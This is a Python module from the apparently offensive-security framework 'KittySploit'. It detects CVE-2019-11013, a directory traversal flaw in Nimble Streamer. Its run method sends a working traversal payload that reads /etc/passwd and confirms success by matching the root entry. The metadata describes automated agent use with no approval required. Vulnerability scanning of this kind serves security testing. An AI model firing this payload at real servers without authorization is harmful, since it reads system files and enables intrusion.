#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Nimble Streamer 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nimble Streamer <=3.5.4-9 - Local File Inclusion Detection',
        'description': 'Nimble Streamer 3.0.2-2 through 3.5.4-9 is vulnerable to local file inclusion. An attacker can traverse the file system to access files or directories that are outside of the restricted directory on the remote server.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'lfi', 'nimble', 'edb', 'packetstorm', 'softvelum', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/47301',
            'https://mayaseven.com/nimble-directory-traversal-in-nimble-streamer-version-3-0-2-2-to-3-5-4-9/',
            'http://packetstormsecurity.com/files/154196/Nimble-Streamer-3.x-Directory-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-11013',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-11013',
    }

    def run(self):
        r = self.http_request(method="GET", path='/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Nimble Streamer <=3.5.4-9 - Local File Inclusion detected",
                path='/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448',
            )
            return True
        return False

